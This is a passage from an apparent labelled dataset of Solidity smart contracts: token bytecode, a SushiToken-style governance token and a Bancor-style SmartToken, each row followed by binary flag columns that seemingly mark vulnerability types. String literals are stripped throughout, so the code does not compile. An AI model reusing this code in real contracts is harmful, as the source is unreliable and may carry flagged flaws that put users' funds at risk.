}}",0x608060405234801561001057600080fd5b506004361061016c5760003560e01c8063715018a6116100cd578063a457c2d711610081578063d505accf11610066578063d505accf146104a1578063dd62ed3e146104ff578063f2fde38b1461053a5761016c565b8063a457c2d71461042f578063a9059cbb146104685761016c565b80637ecebe00116100b25780637ecebe00146103c35780638da5cb5b146103f657806395d89b41146104275761016c565b8063715018a61461038257806379cc67901461038a5761016c565b80633644e5151161012457806340c10f191161010957806340c10f19146102f757806342966c681461033257806370a082311461034f5761016c565b80633644e515146102b657806339509351146102be5761016c565b806318160ddd1161015557806318160ddd1461023b57806323b872dd14610255578063313ce567146102985761016c565b806306fdde0314610171578063095ea7b3146101ee575b600080fd5b61017961056d565b6040805160208082528351818301528351919283929083019185019080838360005b838110156101b357818101518382015260200161019b565b50505050905090810190601f1680156101e05780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102276004803603604081101561020457600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135610622565b604080519115158252519081900360200190f35b61024361063f565b60408051918252519081900360200190f35b6102276004803603606081101561026b57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff813581169160208101359091169060400135610645565b6102a06106e6565b6040805160ff9092168252519081900360200190f35b6102436106ef565b610227600480360360408110156102d457600080fd5b5073ffffffffffffffffffffffffffffffffffffffff81351690602001356106fe565b6103306004803603604081101561030d57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135610759565b005b6103306004803603602081101561034857600080fd5b50356107f8565b6102436004803603602081101561036557600080fd5b503573ffffffffffffffffffffffffffffffffffffffff1661080c565b610330610834565b610330600480360360408110156103a057600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135610934565b610243600480360360208110156103d957600080fd5b503573ffffffffffffffffffffffffffffffffffffffff1661098e565b6103fe6109c2565b6040805173ffffffffffffffffffffffffffffffffffffffff9092168252519081900360200190f35b6101796109de565b6102276004803603604081101561044557600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135610a5d565b6102276004803603604081101561047e57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135610ad2565b610330600480360360e08110156104b757600080fd5b5073ffffffffffffffffffffffffffffffffffffffff813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135610ae6565b6102436004803603604081101561051557600080fd5b5073ffffffffffffffffffffffffffffffffffffffff81358116916020013516610d1f565b6103306004803603602081101561055057600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16610d57565b60038054604080516020601f60027fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156106175780601f106105ec57610100808354040283529160200191610617565b820191906000526020600020905b8154815290600101906020018083116105fa57829003601f168201915b505050505090505b90565b600061063661062f610f5d565b8484610f61565b50600192915050565b60025490565b60006106528484846110a8565b6106dc8461065e610f5d565b6106d785604051806060016040528060288152602001611a6e6028913973ffffffffffffffffffffffffffffffffffffffff8a166000908152600160205260408120906106a9610f5d565b73ffffffffffffffffffffffffffffffffffffffff1681526020810191909152604001600020549190611278565b610f61565b5060019392505050565b60055460ff1690565b60006106f9611329565b905090565b600061063661070b610f5d565b846106d7856001600061071c610f5d565b73ffffffffffffffffffffffffffffffffffffffff908116825260208083019390935260409182016000908120918c168152925290205490610ee2565b610761610f5d565b60075473ffffffffffffffffffffffffffffffffffffffff9081169116146107ea57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015290519081900360640190fd5b6107f482826113f3565b5050565b610809610803610f5d565b82611524565b50565b73ffffffffffffffffffffffffffffffffffffffff1660009081526020819052604090205490565b61083c610f5d565b60075473ffffffffffffffffffffffffffffffffffffffff9081169116146108c557604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015290519081900360640190fd5b60075460405160009173ffffffffffffffffffffffffffffffffffffffff16907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600780547fffffffffffffffffffffffff0000000000000000000000000000000000000000169055565b600061096b82604051806060016040528060248152602001611a96602491396109648661095f610f5d565b610d1f565b9190611278565b905061097f83610979610f5d565b83610f61565b6109898383611524565b505050565b73ffffffffffffffffffffffffffffffffffffffff811660009081526006602052604081206109bc9061166e565b92915050565b60075473ffffffffffffffffffffffffffffffffffffffff1690565b60048054604080516020601f60027fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156106175780601f106105ec57610100808354040283529160200191610617565b6000610636610a6a610f5d565b846106d785604051806060016040528060258152602001611b246025913960016000610a94610f5d565b73ffffffffffffffffffffffffffffffffffffffff908116825260208083019390935260409182016000908120918d16815292529020549190611278565b6000610636610adf610f5d565b84846110a8565b83421115610b5557604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601d60248201527f45524332305065726d69743a206578706972656420646561646c696e65000000604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff871660009081526006602052604081207f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c990899089908990610bab9061166e565b89604051602001808781526020018673ffffffffffffffffffffffffffffffffffffffff1681526020018573ffffffffffffffffffffffffffffffffffffffff16815260200184815260200183815260200182815260200196505050505050506040516020818303038152906040528051906020012090506000610c2e82611672565b90506000610c3e828787876116d9565b90508973ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614610cda57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601e60248201527f45524332305065726d69743a20696e76616c6964207369676e61747572650000604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff8a166000908152600660205260409020610d08906118fc565b610d138a8a8a610f61565b50505050505050505050565b73ffffffffffffffffffffffffffffffffffffffff918216600090815260016020908152604080832093909416825291909152205490565b610d5f610f5d565b60075473ffffffffffffffffffffffffffffffffffffffff908116911614610de857604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff8116610e54576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526026815260200180611a006026913960400191505060405180910390fd5b60075460405173ffffffffffffffffffffffffffffffffffffffff8084169216907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a3600780547fffffffffffffffffffffffff00000000000000000000000000000000000000001673ffffffffffffffffffffffffffffffffffffffff92909216919091179055565b600082820183811015610f5657604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b9392505050565b3390565b73ffffffffffffffffffffffffffffffffffffffff8316610fcd576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526024815260200180611b006024913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8216611039576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180611a266022913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff808416600081815260016020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b73ffffffffffffffffffffffffffffffffffffffff8316611114576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526025815260200180611adb6025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8216611180576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260238152602001806119bb6023913960400191505060405180910390fd5b61118b838383610989565b6111d581604051806060016040528060268152602001611a486026913973ffffffffffffffffffffffffffffffffffffffff86166000908152602081905260409020549190611278565b73ffffffffffffffffffffffffffffffffffffffff80851660009081526020819052604080822093909355908416815220546112119082610ee2565b73ffffffffffffffffffffffffffffffffffffffff8084166000818152602081815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b60008184841115611321576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156112e65781810151838201526020016112ce565b50505050905090810190601f1680156113135780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b505050900390565b60007f0000000000000000000000000000000000000000000000000000000000000001611354611905565b141561138157507fa9e572d7c103a339987674ba85d3bf220c2d3b50e12faa30581b80b4cd57342761061f565b6113ec7f8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f7f6866a1b3bd19f6f11a36f59b0695f22c22d5c4409a12053c9a747a31d67937bb7fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6611909565b905061061f565b73ffffffffffffffffffffffffffffffffffffffff821661147557604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b61148160008383610989565b60025461148e9082610ee2565b60025573ffffffffffffffffffffffffffffffffffffffff82166000908152602081905260409020546114c19082610ee2565b73ffffffffffffffffffffffffffffffffffffffff83166000818152602081815260408083209490945583518581529351929391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a35050565b73ffffffffffffffffffffffffffffffffffffffff8216611590576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526021815260200180611aba6021913960400191505060405180910390fd5b61159c82600083610989565b6115e6816040518060600160405280602281526020016119de6022913973ffffffffffffffffffffffffffffffffffffffff85166000908152602081905260409020549190611278565b73ffffffffffffffffffffffffffffffffffffffff83166000908152602081905260409020556002546116199082611978565b60025560408051828152905160009173ffffffffffffffffffffffffffffffffffffffff8516917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a35050565b5490565b600061167c611329565b8260405160200180807f190100000000000000000000000000000000000000000000000000000000000081525060020183815260200182815260200192505050604051602081830303815290604052805190602001209050919050565b60007f7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a082111561176a57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f45434453413a20696e76616c6964207369676e617475726520732076616c7565604482015290519081900360640190fd5b8360ff16601b148061177f57508360ff16601c145b6117ea57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f45434453413a20696e76616c6964207369676e617475726520762076616c7565604482015290519081900360640190fd5b600060018686868660405160008152602001604052604051808581526020018460ff1681526020018381526020018281526020019450505050506020604051602081039080840390855afa158015611846573d6000803e3d6000fd5b50506040517fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0015191505073ffffffffffffffffffffffffffffffffffffffff81166118f357604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601860248201527f45434453413a20696e76616c6964207369676e61747572650000000000000000604482015290519081900360640190fd5b95945050505050565b80546001019055565b4690565b6000838383611916611905565b30604051602001808681526020018581526020018481526020018381526020018273ffffffffffffffffffffffffffffffffffffffff168152602001955050505050506040516020818303038152906040528051906020012090509392505050565b6000610f5683836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525061127856fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a206275726e20616d6f756e7420657863656564732062616c616e63654f776e61626c653a206e6577206f776e657220697320746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a206275726e20616d6f756e74206578636565647320616c6c6f77616e636545524332303a206275726e2066726f6d20746865207a65726f206164647265737345524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa2646970667358221220fd77525d5811b0476c6aa859e8c0f6389de71d2535d9fc3cd235877d1b83694364736f6c634300060c0033,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity ^0.6.0;abstract contract Context { function _msgSender() internal view virtual returns (address payable) { return msg.sender; } function _msgData() internal view virtual returns (bytes memory) { this; return msg.data; }}pragma solidity ^0.6.0;interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}pragma solidity ^0.6.0;library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}pragma solidity ^0.6.2;library Address { function isContract(address account) internal view returns (bool) { bytes32 codehash; bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470; assembly { codehash := extcodehash(account) } return (codehash != accountHash && codehash != 0x0); } function sendValue(address payable recipient, uint256 amount) internal { require(address(this).balance >= amount, ); (bool success, ) = recipient.call{ value: amount }(); require(success, ); } function functionCall(address target, bytes memory data) internal returns (bytes memory) { return functionCall(target, data, ); } function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) { return _functionCallWithValue(target, data, 0, errorMessage); } function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) { return functionCallWithValue(target, data, value, ); } function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) { require(address(this).balance >= value, ); return _functionCallWithValue(target, data, value, errorMessage); } function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) { require(isContract(target), ); (bool success, bytes memory returndata) = target.call{ value: weiValue }(data); if (success) { return returndata; } else { if (returndata.length > 0) { assembly { let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) } } else { revert(errorMessage); } } }}pragma solidity ^0.6.0;contract ERC20 is Context, IERC20 { using SafeMath for uint256; using Address for address; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; uint8 private _decimals; constructor (string memory name, string memory symbol) public { _name = name; _symbol = symbol; _decimals = 18; } function name() public view returns (string memory) { return _name; } function symbol() public view returns (string memory) { return _symbol; } function decimals() public view returns (uint8) { return _decimals; } function totalSupply() public view override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer(address sender, address recipient, uint256 amount) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve(address owner, address spender, uint256 amount) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _setupDecimals(uint8 decimals_) internal { _decimals = decimals_; } function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }}pragma solidity ^0.6.0;contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () internal { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }}pragma solidity 0.6.12;contract SushiToken is ERC20(, ), Ownable { function mint(address _to, uint256 _amount) public onlyOwner { _mint(_to, _amount); _moveDelegates(address(0), _delegates[_to], _amount); } mapping (address => address) internal _delegates; struct Checkpoint { uint32 fromBlock; uint256 votes; } mapping (address => mapping (uint32 => Checkpoint)) public checkpoints; mapping (address => uint32) public numCheckpoints; bytes32 public constant DOMAIN_TYPEHASH = keccak256(); bytes32 public constant DELEGATION_TYPEHASH = keccak256(); mapping (address => uint) public nonces; event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate); event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance); function delegates(address delegator) external view returns (address) { return _delegates[delegator]; } function delegate(address delegatee) external { return _delegate(msg.sender, delegatee); } function delegateBySig( address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s ) external { bytes32 domainSeparator = keccak256( abi.encode( DOMAIN_TYPEHASH, keccak256(bytes(name())), getChainId(), address(this) ) ); bytes32 structHash = keccak256( abi.encode( DELEGATION_TYPEHASH, delegatee, nonce, expiry ) ); bytes32 digest = keccak256( abi.encodePacked( , domainSeparator, structHash ) ); address signatory = ecrecover(digest, v, r, s); require(signatory != address(0), ); require(nonce == nonces[signatory]++, ); require(now <= expiry, ); return _delegate(signatory, delegatee); } function getCurrentVotes(address account) external view returns (uint256) { uint32 nCheckpoints = numCheckpoints[account]; return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0; } function getPriorVotes(address account, uint blockNumber) external view returns (uint256) { require(blockNumber < block.number, ); uint32 nCheckpoints = numCheckpoints[account]; if (nCheckpoints == 0) { return 0; } if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) { return checkpoints[account][nCheckpoints - 1].votes; } if (checkpoints[account][0].fromBlock > blockNumber) { return 0; } uint32 lower = 0; uint32 upper = nCheckpoints - 1; while (upper > lower) { uint32 center = upper - (upper - lower) / 2; Checkpoint memory cp = checkpoints[account][center]; if (cp.fromBlock == blockNumber) { return cp.votes; } else if (cp.fromBlock < blockNumber) { lower = center; } else { upper = center - 1; } } return checkpoints[account][lower].votes; } function _delegate(address delegator, address delegatee) internal { address currentDelegate = _delegates[delegator]; uint256 delegatorBalance = balanceOf(delegator); _delegates[delegator] = delegatee; emit DelegateChanged(delegator, currentDelegate, delegatee); _moveDelegates(currentDelegate, delegatee, delegatorBalance); } function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal { if (srcRep != dstRep && amount > 0) { if (srcRep != address(0)) { uint32 srcRepNum = numCheckpoints[srcRep]; uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0; uint256 srcRepNew = srcRepOld.sub(amount); _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew); } if (dstRep != address(0)) { uint32 dstRepNum = numCheckpoints[dstRep]; uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0; uint256 dstRepNew = dstRepOld.add(amount); _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew); } } } function _writeCheckpoint( address delegatee, uint32 nCheckpoints, uint256 oldVotes, uint256 newVotes ) internal { uint32 blockNumber = safe32(block.number, ); if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) { checkpoints[delegatee][nCheckpoints - 1].votes = newVotes; } else { checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes); numCheckpoints[delegatee] = nCheckpoints + 1; } emit DelegateVotesChanged(delegatee, oldVotes, newVotes); } function safe32(uint n, string memory errorMessage) internal pure returns (uint32) { require(n < 2**32, errorMessage); return uint32(n); } function getChainId() internal pure returns (uint) { uint256 chainId; assembly { chainId := chainid() } return chainId; }}",,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity ^0.4.11;contract SafeMath { function SafeMath() { } function safeAdd(uint256 _x, uint256 _y) internal returns (uint256) { uint256 z = _x + _y; assert(z >= _x); return z; } function safeSub(uint256 _x, uint256 _y) internal returns (uint256) { assert(_x >= _y); return _x - _y; } function safeMul(uint256 _x, uint256 _y) internal returns (uint256) { uint256 z = _x * _y; assert(_x == 0 || z / _x == _y); return z; }} contract IOwned { function owner() public constant returns (address owner) { owner; } function transferOwnership(address _newOwner) public; function acceptOwnership() public;}contract Owned is IOwned { address public owner; address public newOwner; event OwnerUpdate(address _prevOwner, address _newOwner); function Owned() { owner = msg.sender; } modifier ownerOnly { assert(msg.sender == owner); _; } function transferOwnership(address _newOwner) public ownerOnly { require(_newOwner != owner); newOwner = _newOwner; } function acceptOwnership() public { require(msg.sender == newOwner); OwnerUpdate(owner, newOwner); owner = newOwner; newOwner = 0x0; }}contract ITokenHolder is IOwned { function withdrawTokens(IERC20Token _token, address _to, uint256 _amount) public;}contract TokenHolder is ITokenHolder, Owned { function TokenHolder() { } modifier validAddress(address _address) { require(_address != 0x0); _; } modifier notThis(address _address) { require(_address != address(this)); _; } function withdrawTokens(IERC20Token _token, address _to, uint256 _amount) public ownerOnly validAddress(_token) validAddress(_to) notThis(_to) { assert(_token.transfer(_to, _amount)); }}contract IERC20Token { function name() public constant returns (string name) { name; } function symbol() public constant returns (string symbol) { symbol; } function decimals() public constant returns (uint8 decimals) { decimals; } function totalSupply() public constant returns (uint256 totalSupply) { totalSupply; } function balanceOf(address _owner) public constant returns (uint256 balance) { _owner; balance; } function allowance(address _owner, address _spender) public constant returns (uint256 remaining) { _owner; _spender; remaining; } function transfer(address _to, uint256 _value) public returns (bool success); function transferFrom(address _from, address _to, uint256 _value) public returns (bool success); function approve(address _spender, uint256 _value) public returns (bool success);}contract ERC20Token is IERC20Token, SafeMath { string public standard = ; string public name = ; string public symbol = ; uint8 public decimals = 0; uint256 public totalSupply = 0; mapping (address => uint256) public balanceOf; mapping (address => mapping (address => uint256)) public allowance; event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); function ERC20Token(string _name, string _symbol, uint8 _decimals) { require(bytes(_name).length > 0 && bytes(_symbol).length > 0); name = _name; symbol = _symbol; decimals = _decimals; } modifier validAddress(address _address) { require(_address != 0x0); _; } function transfer(address _to, uint256 _value) public validAddress(_to) returns (bool success) { balanceOf[msg.sender] = safeSub(balanceOf[msg.sender], _value); balanceOf[_to] = safeAdd(balanceOf[_to], _value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint256 _value) public validAddress(_from) validAddress(_to) returns (bool success) { allowance[_from][msg.sender] = safeSub(allowance[_from][msg.sender], _value); balanceOf[_from] = safeSub(balanceOf[_from], _value); balanceOf[_to] = safeAdd(balanceOf[_to], _value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public validAddress(_spender) returns (bool success) { require(_value == 0 || allowance[msg.sender][_spender] == 0); allowance[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; }}contract ISmartToken is ITokenHolder, IERC20Token { function disableTransfers(bool _disable) public; function issue(address _to, uint256 _amount) public; function destroy(address _from, uint256 _amount) public;}contract SmartToken is ISmartToken, ERC20Token, Owned, TokenHolder { string public version = ; bool public transfersEnabled = true; event NewSmartToken(address _token); event Issuance(uint256 _amount); event Destruction(uint256 _amount); function SmartToken(string _name, string _symbol, uint8 _decimals) ERC20Token(_name, _symbol, _decimals) { require(bytes(_symbol).length <= 6); NewSmartToken(address(this)); } modifier transfersAllowed { assert(transfersEnabled); _; } function disableTransfers(bool _disable) public ownerOnly { transfersEnabled = !_disable; } function issue(address _to, uint256 _amount) public ownerOnly validAddress(_to) notThis(_to) { totalSupply = safeAdd(totalSupply, _amount); balanceOf[_to] = safeAdd(balanceOf[_to], _amount); Issuance(_amount); Transfer(this, _to, _amount); } function destroy(address _from, uint256 _amount) public ownerOnly { balanceOf[_from] = safeSub(balanceOf[_from], _amount); totalSupply = safeSub(totalSupply, _amount); Transfer(_from, this, _amount); Destruction(_amount); } function transfer(address _to, uint256 _value) public transfersAllowed returns (bool success) { assert(super.transfer(_to, _value)); if (_to == address(this)) { balanceOf[_to] -= _value; totalSupply -= _value; Destruction(_value); } return true; } function transferFrom(address _from, address _to, uint256 _value) public transfersAllowed returns (bool success) { assert(super.transferFrom(_from, _to, _value)); if (_to == address(this)) { balanceOf[_to] -= _value; totalSupply -= _value; Destruction(_value); } return true; }}",,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0
"pragma solidity ^0.6.0;interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}pragma solidity ^0.6.0;abstract contract Context { function _msgSender() internal view virtual returns (address payable) { return msg.sender; } function _msgData() internal view virtual returns (bytes memory) { this; return msg.data; }}pragma solidity ^0.6.0;library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}pragma solidity ^0.6.2;library Address { function isContract(address account) internal view returns (bool) { bytes32 codehash; bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470; assembly { codehash := extcodehash(account) } return (codehash != accountHash && codehash != 0x0); } function sendValue(address payable recipient, uint256 amount) internal { require(address(this).balance >= amount, ); (bool success, ) = recipient.call{ value: amount }(); require(success, ); } function functionCall(address target, bytes memory data) internal returns (bytes memory) { return functionCall(target, data, ); } function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) { return _functionCallWithValue(target, data, 0, errorMessage); } function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) { return functionCallWithValue(target, data, value, ); } function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) { require(address(this).balance >= value, ); return _functionCallWithValue(target, data, value, errorMessage); } function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) { require(isContract(target), ); (bool success, bytes memory returndata) = target.call{ value: weiValue }(data); if (success) { return returndata; } else { if (returndata.length > 0) { assembly { let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) } } else { revert(errorMessage); } } }}pragma solidity ^0.6.0;contract ERC20 is Context, IERC20 { using SafeMath for uint256; using Address for address; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; uint8 private _decimals; constructor (string memory name, string memory symbol) public { _name = name; _symbol = symbol; _decimals = 18; } function name() public view returns (string memory) { return _name; } function symbol() public view returns (string memory) { return _symbol; } function decimals() public view returns (uint8) { return _decimals; } function totalSupply() public view override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { 